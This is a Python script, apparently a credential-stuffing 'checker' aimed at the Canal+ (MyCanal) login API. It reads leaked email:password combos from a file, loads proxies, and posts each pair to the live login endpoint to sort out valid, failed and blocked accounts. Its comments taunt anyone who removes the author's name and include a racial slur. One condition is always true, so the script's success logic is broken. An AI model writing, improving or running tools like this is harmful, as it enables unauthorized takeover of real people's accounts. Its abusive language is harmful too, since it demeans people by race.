import requests
import os
import sys
import json
import ctypes
#If U removed my name hhh - u are = script kid and nigaa
def cls():
    os.system("cls")

def check(email,password):
    data = {"email": email, "password": password, "portailId": "TSRm9mZl5Rs.", "media": "WEBEC", "vect": "INTERNET"}
    r = requests.post("https://pass-api-v2.canal-plus.com/services/apipublique/login", data=data)
    return r.text
    
#u are hhh Nooop (Mater is awesome) u are stupid If you remove my name
banner=(""" 
███╗   ███╗██╗   ██╗ ██████╗ █████╗ ███╗   ██╗ █████╗ ██╗     
████╗ ████║╚██╗ ██╔╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██║     
██╔████╔██║ ╚████╔╝ ██║     ███████║██╔██╗ ██║███████║██║     
██║╚██╔╝██║  ╚██╔╝  ██║     ██╔══██║██║╚██╗██║██╔══██║██║     
██║ ╚═╝ ██║   ██║   ╚██████╗██║  ██║██║ ╚████║██║  ██║███████╗
╚═╝     ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
Coded by:XTRUE0                                                   
""")
account_number = 0
proxy_number = 0
account_position = 0
proxy_position = 0
cls()
ctypes.windll.kernel32.SetConsoleTitleW("Mycanal+ | Developed by Mater ")
print(banner)
try:
    file = open("combo.txt","r")
    combo = file.readlines()
    if len(combo) > 0:
        file.close()
    else:
        file.close()
        sys.exit("You have to fill in the combo.txt file for it to work")
except FileNotFoundError:
    print(" No combo.txt file found! \n No worries, we'll make you one ")
    file = open("combo.txt","a")
    file.close()
    sys.exit("You have to fill in the combo.txt file for it to work")

try:
    file = open("proxy.txt","r")
    proxies = file.readlines()
    if len(proxies) > 0:
        file.close()
    else:
        file.close()
        sys.exit("[i] You have to fill in the proxy.txt file for it to work")
except FileNotFoundError:
    print("No proxy.txt file found! \n No worries, we'll make you one :)")
    file = open("proxy.txt","a")
    file.close()
    sys.exit(" You have to fill in the proxy.txt file for this to work ")

for account in combo:
    account_number+=1

for proxy in proxies:
    proxy_number+=1

print("Size of the combo: " + str(account_number))
print("Number of proxys: " + str(proxy_number))
ctypes.windll.kernel32.SetConsoleTitleW("Mycanal+_checker|Developed By: Mater ")

while account_position < account_number:
    credentials = combo[account_position]
    credentials = credentials.strip().split(':')
    email = credentials[0]
    password = credentials[1]
    result = check(email,password)
    print(result)
    if "Email missing or invalid" in result:
        print("["+str(account_position)+"/"+ str(account_number)+"] FAIL ~> " + email)
    elif "Info : Blocked account" in result:
        print("["+str(account_position)+"/"+ str(account_number)+"] BLOCKED ~> " + email)
    elif "Invalid login or password":
 #u are hhh Nooop (Mater is awesome) u are stupid If you remove my name
       print("["+str(account_position)+"/"+ str(account_number)+"] FAIL ~> " + email)
    else:
        print(result)
    account_position+=1
